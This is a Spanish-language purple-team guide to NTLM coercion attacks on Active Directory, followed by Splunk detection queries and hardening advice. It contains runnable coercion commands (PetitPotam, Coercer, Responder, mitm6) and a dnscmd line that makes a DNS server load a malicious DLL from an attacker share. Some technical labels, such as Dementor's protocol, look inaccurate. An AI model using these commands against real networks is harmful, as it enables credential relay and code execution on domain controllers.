# 🛑 Ataques de **Coerción NTLM en Active Directory** (Familia Coerce: PrinterBug, PetitPotam, Dementor, ShadowCoerce, DFSCoerce, Coercer, ADIDNS/DNSadmin, Responder, WPAD/LLMNR/mDNS, y más)

---

## 📝 ¿Qué son los ataques de Coerción NTLM?

| Concepto      | Descripción                                                                                                            |
|---------------|-----------------------------------------------------------------------------------------------------------------------|
| **Definición**| Familia de técnicas que abusan de protocolos y servicios Windows para forzar a un servidor (ej. DC) a autenticarse NTLM contra un host controlado por el atacante. |
| **Finalidad** | Obtener autenticaciones privilegiadas (NTLM) para relaying, escalada lateral, takeover de recursos o persistencia.      |

---

## 🛠️ ¿Cómo funcionan los ataques de coerción? (TTPs y ejemplos)

| Vector/Nombre              | Protocolo/Servicio             | Descripción breve                                                                                 |
|----------------------------|-------------------------------|--------------------------------------------------------------------------------------------------|
| **PrinterBug**             | MS-RPRN / Print Spooler       | Abusa del spooler para forzar autenticación a un recurso UNC remoto.                             |
| **PetitPotam**             | EFSRPC                        | Coerción a través de MS-EFSRPC, fuerza autenticación NTLM a recurso controlado.                  |
| **Dementor**               | DRSUAPI                       | Aprovecha el API de replicación de AD para forzar autenticación de DCs.                          |
| **ShadowCoerce**           | VSS (Shadow Copy)             | Usa VSS para forzar autenticación de sistemas críticos.                                           |
| **DFSCoerce**              | DFSNM (Distributed File System Namespace)| Coerción usando DFSN para NTLM relay.                                              |
| **Coercer**                | Multiprotocolo (automatiza abuso) | Framework que automatiza coerción sobre múltiples protocolos/pipes conocidos y futuros.      |
| **ADIDNS/DNSadmin**        | DNS / dnscmd                  | Abusa de permisos DNSAdmins para forzar autenticación remota vía registros maliciosos.           |
| **Responder**              | LLMNR/NBT-NS/WPAD/mDNS        | Suplantación de respuestas en protocolos legacy para forzar autenticaciones de clientes.          |
| **WPAD/LLMNR/mDNS/MITM6**  | Proxy/WPAD/DNSv6              | Ataques de MITM y manipulación de descubrimiento de proxies para forzar autenticaciones.          |
| **FSRVPCoerce**            | FSRVP                         | Abusa del File Share Shadow Copy Provider para coerción.                                          |
| **SchtasksCoerce**         | Schtasks                      | Usa programación de tareas remotas para forzar autenticación.                                     |
| **ICPRCoerce**             | ICertPassageRemote            | Coerción vía servicios/funciones de Certificados (CA).                                            |
| **Otros futuros/derivados**| Pipes y servicios emergentes  | Cualquier nuevo servicio Windows que acepte recursos UNC puede ser objetivo de coerción.          |

---

## 💻 Ejemplo práctico (familia completa)

```bash
# PrinterBug (MS-RPRN)
python3 printerbug.py essos.local/user:pass@192.168.57.10 192.168.57.151

# PetitPotam (EFSRPC)
python3 PetitPotam.py -u user -p pass -d essos.local 192.168.57.10 192.168.57.151

# Dementor (DRSUAPI)
python3 dementor.py -u user -p pass -d essos.local 192.168.57.10 192.168.57.151

# ShadowCoerce (VSS)
python3 shadowcoerce.py -u user -p pass -d essos.local 192.168.57.10 192.168.57.151

# DFSCoerce (DFSNM)
python3 dfscoerce.py -u user -p pass -d essos.local 192.168.57.10 192.168.57.151

# Coercer (Multiprotocolo, incluye variantes y futuras)
python3 Coercer.py -u user -p pass -d essos.local -t 192.168.57.10 -l 192.168.57.151

# ADIDNS/DNSadmin
dnscmd <DNS-Server> /config /serverlevelplugindll \\192.168.57.151\share\malicious.dll

# Responder (LLMNR/NBT-NS/WPAD/mDNS)
sudo responder -I eth0

# MITM6 (IPv6, WPAD/mDNS/LLMNR)
python3 mitm6.py --ignore-nofqdn -d essos.local

# FSRVPCoerce/SchtasksCoerce/ICPRCoerce
# (Ejemplo genérico, usando Coercer para automatizar)
python3 Coercer.py --method FSRVP --target 192.168.57.10 --listener 192.168.57.151
```

---

## 📊 Detección en logs y SIEM (Splunk)

| Campo clave                     | Descripción                                                                  |
|---------------------------------|------------------------------------------------------------------------------|
| **EventCode = 5145**            | Acceso a recursos compartidos/Pipes nombrados (SMB).                         |
| **ObjectName**                  | Pipe vulnerable: `\efsrpc`, `\spoolss`, `\netdfs`, `\vss`, `\lsarpc`...      |
| **4624/4625/8004**              | Autenticaciones NTLM entrantes/salientes tras el acceso al pipe.             |
| **Client_Address / IpAddress**  | Origen de la petición/relayed authentication.                                |
| **ProcessName**                 | Proceso iniciador (útil con Sysmon).                                         |

### Query Splunk básica (acceso a pipes sospechosos)

```splunk
index=dc_logs sourcetype=WinEventLog:Security EventCode=5145
| search Object_Name="\\pipe\\efsrpc" OR Object_Name="\\pipe\\spoolss" OR Object_Name="\\pipe\\netdfs" OR Object_Name="\\pipe\\vss" OR Object_Name="\\pipe\\lsarpc"
| table _time, ComputerName, SubjectAccountName, Object_Name, IpAddress
```

### Detección de autenticaciones NTLM sospechosas tras coerción

```splunk
index=dc_logs sourcetype=WinEventLog:Security (EventCode=4624 OR EventCode=4625)
| search AuthenticationPackageName="NTLM"
| table _time, ComputerName, Account_Name, IpAddress, LogonType
```

### Buscar secuencias de acceso a pipe + autenticación NTLM

```splunk
index=dc_logs sourcetype=WinEventLog:Security (EventCode=5145 OR EventCode=4624)
| transaction IpAddress maxspan=5s
| search Object_Name="\\pipe\\efsrpc" OR Object_Name="\\pipe\\spoolss" OR Object_Name="\\pipe\\netdfs" OR Object_Name="\\pipe\\vss" OR Object_Name="\\pipe\\lsarpc"
| where AuthenticationPackageName="NTLM"
| table _time, ComputerName, IpAddress, Object_Name, Account_Name
```

### Detección de ataques a DNSAdmin/ADIDNS

```splunk
index=dc_logs sourcetype=WinEventLog:Security (EventCode=5136 OR EventCode=4670)
| search Object_Name="serverlevelplugindll"
| table _time, SubjectAccountName, Object_Name, ComputerName
```

### Detección de Responder/MITM6 (Solicitudes LLMNR/NBT-NS/WPAD/mDNS)

> Importante: Para cazar Responder/LLMNR/MITM6, además de logs de Windows, monitoriza tráfico de red:
- Alertas de múltiples NetBIOS/LLMNR/mDNS queries.
- Solicitudes WPAD anómalas en logs de proxy/firewall.
- Cambios en registros DNS y DHCP.

---

## 🔎 Queries avanzadas de hunting

### 1. Hosts que acceden a varios pipes de coerción en poco tiempo

```splunk
index=dc_logs sourcetype=WinEventLog:Security EventCode=5145
| search Object_Name="\\pipe\\efsrpc" OR Object_Name="\\pipe\\spoolss" OR Object_Name="\\pipe\\netdfs" OR Object_Name="\\pipe\\vss" OR Object_Name="\\pipe\\lsarpc"
| stats count by IpAddress, Object_Name
| where count > 2
```

### 2. Correlación con herramientas sospechosas (Sysmon: proceso Python/Impacket)

```splunk
index=sysmon_logs EventCode=1
| search (Image="*python.exe" OR Image="*impacket*" OR Image="*Coercer*" OR Image="*mitm6*" OR Image="*responder*")
| table _time, Computer, User, Image, CommandLine
```

### 3. Detección de DC autenticándose fuera de la red (“machine account authentication”)

```splunk
index=dc_logs sourcetype=WinEventLog:Security EventCode=4624
| search Account_Name="*$" AND (NOT (IpAddress="10.*" OR IpAddress="192.168.*" OR IpAddress="172.16.*"))
| table _time, Account_Name, IpAddress, ComputerName
```

---

## 🦾 Hardening y mitigación

| Medida                                       | Descripción                                                                                      |
|-----------------------------------------------|-------------------------------------------------------------------------------------------------|
| **Deshabilitar servicios vulnerables**        | EFS, Print Spooler, VSS, DFSNM, FSRVP, etc. en DCs y servidores que no los requieran.            |
| **Limitación SMB/RPC**                       | Restringe acceso a 445/135 solo a hosts legítimos (firewall, segmentación, IPSec).               |
| **Deshabilitar protocolos legacy**           | LLMNR, NBT-NS, WPAD, mDNS en todo el parque (GPO, directivas de red, hardening).                 |
| **Aplicar parches**                           | Mantén todos los parches críticos aplicados (CVE-2021-36942 y posteriores).                      |
| **SMB Signing y canal seguro**                | Fuerza SMB signing y canal seguro en DCs y servidores críticos.                                  |
| **Auditoría y monitorización**                | Habilita logs detallados de acceso a pipes y autenticaciones NTLM.                               |
| **Zero Trust y segmentación**                 | Microsegmenta y limita rutas de administración remota y tráfico SMB/RPC lateral.                 |
| **Deshabilitar NTLM**                         | Donde sea posible, deshabilita NTLM o limita uso a sistemas legacy bien controlados.             |
| **Inventariado y revisión periódica**         | Scripts periódicos para detectar exposición de servicios/pipes y detectar nuevos vectores.        |
| **Alertas proactivas**                        | Alertas automáticas en SIEM ante cualquier acceso inesperado a pipes, servicios o DNSAdmin.       |
| **Honeypipes y honeypots**                    | Implementa pipes/servicios señuelo para detectar y alertar ante intentos de coerción.            |
| **Monitorización de red avanzada**            | Usa IDS/IPS, Netflow y reglas personalizadas para detectar patrones de Responder/MITM6.           |

---

## 🧑‍💻 ¿Cómo revisar servicios vulnerables activos? (PowerShell)

```powershell
Get-Service EFS, Spooler, VSS, DFSN, FSRVP | Where-Object {$_.Status -eq 'Running'}
```

### Listar pipes expuestos actualmente

```powershell
Get-ChildItem -Path \\.\pipe\ | Where-Object { $_.Name -match "efsrpc|spoolss|netdfs|vss|lsarpc" }
```

### Validar reglas de firewall críticas

```powershell
Get-NetFirewallRule | Where-Object { $_.LocalPort -eq 445 -or $_.LocalPort -eq 135 }
```

### Validar estado de protocolos legacy (ej. LLMNR, WPAD)

- **GPO para LLMNR:**
    - Computer Configuration > Administrative Templates > Network > DNS Client > Turn Off Multicast Name Resolution = Enabled

- **Deshabilitar WPAD (IE/Edge):**
    - Computer Configuration > Administrative Templates > Windows Components > Internet Explorer > Disable Automatic Proxy Result Cache = Enabled

---

## 🧠 Soluciones innovadoras y hardening avanzado

- **Honeypipes y honeyservices:**  
  Deploy pipes/servicios señuelo que alerten instantáneamente en SIEM si se accede a ellos (detección proactiva de Red Team/Threat Actor).

- **Reducción de ataque en legacy:**  
  Proxy SMB/RPC legacy solo para hosts legacy estrictamente controlados, con alertas de uso.

- **Automatización de inventariado y exposición:**  
  Scripts periódicos que reportan exposición de servicios/pipes críticos y alertan ante nuevos vectores.

- **Threat Intelligence Automation & ML:**  
  Correlaciona IOC de herramientas ofensivas, comportamiento anómalo en pipes, y bloquea automáticamente en firewall, NAC o EDR.

- **Uso de YARA para pipes/servicios:**  
  YARA custom en EDR para procesos que abran pipes sospechosos o usen nombres de servicio de coerción.

- **Integración con SOAR:**  
  Playbooks automáticos que deshabilitan servicios, aíslan máquinas o informan a Blue Team tras detección de patrón de coerción.

---

## 📚 Referencias

- [PetitPotam - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/petitpotam)
- [Coercer Project](https://github.com/p0dalirius/Coercer)
- [Responder](https://github.com/lgandx/Responder)
- [MITM6](https://github.com/dirkjanm/mitm6)
- [Microsoft Guidance on EFSRPC/SMBCoercion](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)
- [DFSCerce/PrinterBug/Impacket](https://github.com/fortra/impacket)
